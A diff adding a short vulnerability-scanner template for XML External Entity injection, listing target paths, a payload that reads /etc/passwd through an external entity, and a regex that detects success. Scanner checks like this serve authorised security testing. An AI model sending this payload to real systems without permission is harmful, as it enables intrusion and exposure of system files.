@@ -1,0 +1,7 @@
+name: "XML External Entity"
+severity: "High"
+paths:
+  - "/xml.php"
+  - "/api/xml"
+payloads: ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"]
+detect_regex: "root:x:0:0"
